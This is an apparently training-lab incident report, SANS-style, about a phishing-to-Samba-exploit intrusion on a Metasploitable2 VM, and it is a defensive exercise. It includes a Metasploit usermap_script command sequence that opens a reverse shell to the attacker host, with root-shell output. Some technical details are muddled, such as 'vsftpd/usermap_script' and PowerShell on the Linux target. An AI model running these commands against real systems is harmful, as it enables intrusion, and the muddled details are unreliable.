# Capstone Incident Report — INC-2026-0401
**Template:** SANS Incident Response Report
**Analyst:** SOC Analyst — cyart-soc-team
**Date:** 02 April 2026
**Classification:** TLP: AMBER

---

## Executive Summary

On 01 April 2026, a threat actor operating from IP `10.0.2.20` conducted a multi-stage attack against the internal lab environment. The attack began with a phishing attempt (T1566), escalated to credential abuse (T1078), and culminated in a Samba service exploitation (T1210) against Metasploitable2 at `192.168.10.5`. Wazuh detected the intrusion at 08:05 AM and the SOC team achieved full containment by 11:30 AM. SOAR automation blocked the attacker IP within 47 seconds of confirmed detection. Post-incident RCA identified weak email filtering and absence of MFA as root causes. All three affected accounts were locked, the attacker IP was blocked, and corrective actions have been initiated.

---

## Incident Timeline

| Time (01 Apr 2026) | Actor         | Action                                        | Detection |
|--------------------|---------------|-----------------------------------------------|-----------|
| 06:50 AM           | Attacker      | Phishing email sent from 10.0.2.20            |  Missed  |
| 06:58 AM           | testuser      | Clicked malicious link — credentials stolen   |  Missed  |
| 07:00 AM           | Attacker      | SMB login with stolen credentials             |  Partial |
| 07:15 AM           | Attacker      | Samba usermap_script exploit executed         |  Missed  |
| 07:22 AM           | Attacker      | Root shell obtained on 192.168.10.5           |  Missed  |
| 08:05 AM           | Wazuh         | Alert: Samba exploit detected (T1210)         |  Alert   |
| 08:20 AM           | SOC Analyst   | INC-2026-0401 opened in TheHive               | —         |
| 08:47 AM           | SOAR          | 10.0.2.20 auto-blocked via CrowdSec           | —         |
| 09:15 AM           | SOC Analyst   | testuser + admin_temp accounts locked         | —         |
| 10:05 AM           | SOC Analyst   | Metasploitable2 VM isolated from network      | —         |
| 11:30 AM           | SOC Analyst   | Incident fully contained                      | —         |

---

## Root Cause Analysis

**Primary Root Cause:** Outdated Samba service (vsftpd/usermap_script) running on Metasploitable2 without patching.

**Contributing Factors:**
- No email gateway threat intel integration (phishing missed)
- No MFA on domain accounts (credential abuse enabled)
- Wazuh detection rule delayed (MTTD: 1h 15min post-exploitation)

**5 Whys Summary:**
1. Why was the Samba exploit successful? — Unpatched service running
2. Why was the service unpatched? — No vulnerability management schedule
3. Why no schedule? — No documented patch management process
4. Why no process? — Runbooks lacked patch cadence definition
5. Why? — No ownership assigned for network service maintenance

---

## Attack Details

### Metasploit Exploitation

```bash
# On Kali Linux (10.0.2.20)
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.10.5
set LHOST 10.0.2.20
set LPORT 4444
run

# Result:
[*] Started reverse TCP handler on 10.0.2.20:4444
[*] Command shell session 1 opened
# → root shell on 192.168.10.5
```

### Caldera Emulation (T1210)

| Timestamp           | TTP    | Description                      | Wazuh Detection |
|---------------------|--------|----------------------------------|-----------------|
| 2026-04-01 08:00:00 | T1210  | Samba exploit via Caldera OP-003 |  Detected     |
| 2026-04-01 08:01:00 | T1059  | PowerShell post-exploit          |  Detected     |
| 2026-04-01 08:02:00 | T1087  | User enumeration                 |  Detected     |

---

## Detection & Triage

**Wazuh Alert:**

| Alert ID     | Source IP   | Destination    | Rule ID | Severity | Description             |
|--------------|-------------|----------------|---------|----------|-------------------------|
| WAZUH-190041 | 10.0.2.20   | 192.168.10.5   | 5712    | High     | Samba exploit attempt   |
| WAZUH-190042 | 10.0.2.20   | 192.168.10.5   | 100010  | Critical | Root shell obtained     |
| WAZUH-190043 | 10.0.2.20   | 192.168.10.5   | 4672    | High     | Privilege escalation    |

**TheHive Triage:**

| Case ID       | Priority | Status      | Assigned To  |
|---------------|----------|-------------|--------------|
| TH-2026-0401  | High (3) | In Progress | SOC Analyst  |

---

## Response & Containment

| Action                        | Tool        | Status   | Timestamp           |
|-------------------------------|-------------|----------|---------------------|
| Block 10.0.2.20               | CrowdSec    |  Done  | 2026-04-01 08:47 AM |
| Lock testuser account         | AD          |  Done  | 2026-04-01 09:15 AM |
| Lock admin_temp account       | AD          |  Done  | 2026-04-01 09:15 AM |
| Isolate 192.168.10.5 VM       | Hypervisor  |  Done  | 2026-04-01 10:05 AM |
| Verify isolation (ping test)  | cmd.exe     |  Done  | 2026-04-01 10:10 AM |
| Password resets initiated     | AD          |  Done  | 2026-04-01 09:30 AM |

**Ping Verification:**
```bash
ping 192.168.10.5
# Request timeout — VM successfully isolated 
```

---

## SOAR Automation

TheHive SOAR Playbook CAP-001 triggered automatically on Wazuh alert:

| Playbook Step      | Result        | Time         |
|--------------------|---------------|--------------|
| Parse Alert        |  IP extracted | 08:47:01 AM |
| VT IP Check        |  Malicious   | 08:47:08 AM |
| CrowdSec Block     |  Blocked     | 08:47:23 AM |
| TheHive Case       |  TH-2026-0401| 08:47:35 AM |
| SOC Notification   |  Sent        | 08:47:48 AM |

**Total automation time: 47 seconds**

---

## Post-Incident Metrics

| Metric         | Value       | Target     | Status    |
|----------------|-------------|------------|-----------|
| MTTD           | 1h 15 min   | < 1 hour   |  Close  |
| MTTR           | 3h 25 min   | < 4 hours  |  Met    |
| Dwell Time     | ~4h 30 min  | < 2 hours  |  Above  |
| Containment    | 100%        | 100%       |  Met    |

---

## Recommendations

| Priority | Action                                           | Owner        | ETA      |
|----------|--------------------------------------------------|--------------|----------|
| Critical | Patch Samba/vsftpd on all exposed hosts          | IT Admin     | 7 days   |
| Critical | Enable MFA on all domain accounts                | IT Admin     | 7 days   |
| High     | Tune Wazuh for T1210 faster detection            | SOC Lead     | 14 days  |
| High     | Integrate OTX feed with email gateway            | Security Eng | 30 days  |
| Medium   | Implement vulnerability management schedule      | Security Eng | 30 days  |
| Medium   | Deploy network segmentation (DMZ / VLAN)         | Network Eng  | 60 days  |

---

*Incident Report Author: SOC Analyst | cyart-soc-team | 02 April 2026*
*Template: SANS Incident Response Report Format*
